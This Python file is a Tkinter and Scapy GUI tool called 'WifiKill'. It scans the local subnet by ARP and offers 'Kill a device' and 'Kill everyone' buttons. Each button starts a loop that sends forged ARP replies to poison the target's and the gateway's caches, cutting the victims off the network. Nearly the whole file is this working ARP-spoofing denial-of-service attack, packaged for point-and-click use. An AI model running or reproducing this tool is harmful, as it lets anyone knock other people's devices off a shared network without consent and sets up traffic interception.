from tkinter import *
from scapy.all import *
import socket
import os
import time
import threading

app = Tk()
app.geometry("1010x600")
app.title("WifiKill GUI -Made by IceSpeaker")
app.iconbitmap(r'nowifi.ico')


line1 = Label(text = "WifiKill GUI application", bg = "red", width = 113, height = 2, font = ("arial", 11, "bold"))
line1.grid()

BackGround = Label(width = 35, height = 33, bg = "light grey")
BackGround.place(x = 10, y = 90)

ScanButton = Button(text = "Start the Scan", bg = "green", width = 20, command = lambda:scan(), font = "Arial 12")
ScanButton.place(x = 40, y = 50)

IPtitle = Label(text = "IP addresses", fg = "black")
IPtitle.place(x = 40, y = 100)

MACtitle = Label(text = "MAC addresses", fg = "black")
MACtitle.place(x = 130, y = 100)

KillText = Label(text = "Attacks", fg = "black", font = "Arial 12")
KillText.place(y = 50, x = 400)

Individual = Label(text = "Kill a device", fg = "black")
Individual.place(x = 400, y = 90)

IPEntry = Entry(width = 15, bg = "light grey", fg = "black")
IPEntry.place(x = 400, y = 130)

IPtext = Label(text = "Enter targets IP: ", fg = "black")
IPtext.place(y = 130, x = 310)

MACEntry = Entry(width = 20, bg = "light grey", fg = "black")
MACEntry.place(x = 420, y = 160)

MACtext = Label(text = "Enter targets MAC: ", fg = "black")
MACtext.place(x = 310, y = 160)

Attack = Button(text = "Start the Attack", bg = "green", fg = "black", width = 13,font = "Arial 12", command = lambda:attack())
Attack.place(x = 380, y = 200)

idk = Label(text = "Information/Settings", fg = "black", font = "Arial 12")
idk.place(y = 50, x = 730)

killall1 = Label(text = "Kill everyone", fg = "black")
killall1.place(x = 400, y = 300)


def get_lan_ip():

    s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    s.connect(("google.com", 80))
    ip = s.getsockname()
    s.close()
    return ip[0]

myip = get_lan_ip()
ip_list = myip.split('.')
del ip_list[-1]
ip_list.append('*')
ip_range = '.'.join(ip_list)
del ip_list[-1]
ip_list.append('1')
gateway = '.'.join(ip_list)



data_string3 = StringVar()
data_string3.set(gateway)

gatewayIP = Entry(fg = "black", width = 15, textvariable = data_string3, state = "readonly")
gatewayIP.place(x = 800, y = 130)

MyIPtext = Label(text = "Gateway IP: ", fg = "black")
MyIPtext.place(y = 130, x = 730)

def get_lan_ip1():

    s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    s.connect(("google.com", 80))
    ip = s.getsockname()
    s.close()
    return ip[0]

myip = get_lan_ip1()

data_string4 = StringVar()
data_string4.set(myip)

MyLocalIP = Entry(bg = "light grey", fg = "black", width = 15, textvariable = data_string4)
MyLocalIP.place(x = 800, y = 190)

MyLocalIPText = Label(text = "My local IP: ", fg = "black")
MyLocalIPText.place(y = 190, x = 730)


a = (Ether().src)

data_string5 = StringVar()
data_string5.set(a)

MyMac = Entry(bg = "light grey", fg = "black", width = 15, textvariable = data_string5)
MyMac.place(x = 800, y = 210)

MyMacText = Label(fg = "black", text = "My Mac: ")
MyMacText.place(y = 210, x = 730)


arp_request2 = ARP(pdst = gateway, psrc = "192.168.0.70")
broadcast2 = Ether(dst = "ff:ff:ff:ff:ff:ff")
ARP_request_broadcast3 = broadcast2/arp_request2

answered = srp(ARP_request_broadcast3, timeout = 1, verbose = False)[0]

for element in answered:
    gatewayMAC = (element[1].hwsrc)

data_string6 = StringVar()
data_string6.set(gatewayMAC)

gatewayMAC1 = Entry(width = 15, fg = "black", textvariable = data_string6, state = "readonly")
gatewayMAC1.place(x = 820, y = 150)

GatewayMACTEXT = Label(text = "Gateway MAC: ", fg = "black")
GatewayMACTEXT.place(y = 150, x = 730)

GatewayIPis = gatewayIP.get()
scanTEXT = str(GatewayIPis) + "/24"


def scan():
    arp_request = ARP(pdst = scanTEXT, psrc = "192.168.0.70")
    broadcast = Ether(dst = "ff:ff:ff:ff:ff:ff")
    ARP_request_broadcast = broadcast/arp_request

    answered = srp(ARP_request_broadcast, timeout = 1, verbose = False)[0]

    x = 120



    for element in answered:
        device = element[1].psrc
        mac = element[1].hwsrc

        data_string = StringVar()
        data_string.set(device)

        data_string1 = StringVar()
        data_string1.set(mac)
        
        deviceIP = Entry(textvariable = data_string, bg = "light grey", fg = "black", width = 11, state = "readonly")
        deviceMAC = Entry(textvariable = data_string1, bg = "light grey", fg = "black", width = 15, state = "readonly")

        x += 20
        deviceIP.place(x = 40, y = x)
        deviceMAC.place(x = 130, y = x)

global dead
dead = False


def attack():
  

    my_thread = threading.Thread(target = attack1)
    my_thread.start()

    global dead
    dead = False

    stop = Button(text = "Stop the Attack", bg = "red", fg = "black", width = 13 ,font = "Arial 12", command = lambda:stop())
    stop.place(x = 380, y = 200)

    Text1 = Label(text = "The attack has started", fg = "red")
    Text1.place(x = 380, y = 250)

    def stop():
        global dead
        dead = True

        Attack2 = Button(text = "Start the Attack", bg = "green", fg = "black", width = 13,font = "Arial 12", command = lambda:attack())
        Attack2.place(x = 380, y = 200)

        Text1 = Label(text = " ", width = 17, height = 2)
        Text1.place(x = 380, y = 250)


def attack1():

        

        TargetIP = IPEntry.get()
        TargetMAC = MACEntry.get()
        GatewayIPis = gatewayIP.get()
        MyMacIs = MyMac.get()
        GatewayMACIs = gatewayMAC1.get()

        arp_request3 = ARP(pdst = TargetIP, psrc = GatewayIPis,hwsrc = MyMacIs, op = 2)
        broadcast3 = Ether(dst = TargetMAC)
        ARP_request_broadcast3 = broadcast3/arp_request3

        arp_request4 = ARP(pdst = GatewayIPis, psrc = TargetIP,hwsrc = TargetMAC , op = 2)
        broadcast4 = Ether(dst =  GatewayMACIs)
        ARP_request_broadcast4 = broadcast4/arp_request4

        
        while (not dead):
        
           sendp(ARP_request_broadcast3)
           sendp(ARP_request_broadcast4)


KillAllBut = Button(text = "Kill Everyone", fg = "black", bg = "green", width = 13, font = "Arial 12", command = lambda:KillAll2())
KillAllBut.place(x = 380, y = 350)

global dead1
dead1 = False

def KillAll2():

    global dead1
    dead1 = False

    my_thread2 = threading.Thread(target = KillAll)
    my_thread2.start()

    stop1 = Button(text = "Stop the attack", bg = "red", fg = "black", font = "Arial 12", width = 13,command = lambda:stop2())
    stop1.place(x = 380, y = 350)

    text2 = Label(text = "The attack has started", fg = "red")
    text2.place(x = 380, y = 390)


def stop2():
    global dead1
    dead1 = True

    KillAllBut1 = Button(text = "Kill Everyone", fg = "black", bg = "green", width = 13, font = "Arial 12", command = lambda:KillAll2())
    KillAllBut1.place(x = 380, y = 350)

    text2 = Label(text = "", width = 17, height = 2)
    text2.place(x = 380, y = 390)

def KillAll():

    GatewayIPis = gatewayIP.get()
    scanTEXT = str(GatewayIPis) + "/24"
    MyMacIs = MyMac.get()
    GatewayMACIs = gatewayMAC1.get()

    arp_request = ARP(pdst = scanTEXT, psrc = GatewayIPis,hwsrc = MyMacIs , op = 2)
    broadcast = Ether(dst = "ff:ff:ff:ff:ff:ff")
    ARP_request_broadcast = broadcast/arp_request
    

    arp_request2 = ARP(pdst = GatewayIPis, psrc = scanTEXT,hwsrc = MyMacIs , op = 2)
    broadcast2 = Ether(dst = GatewayMACIs)
    ARP_request_broadcast2 = broadcast2/arp_request2
    
    

    while (not dead1):

       sendp(ARP_request_broadcast)
       sendp(ARP_request_broadcast2)


app.mainloop()
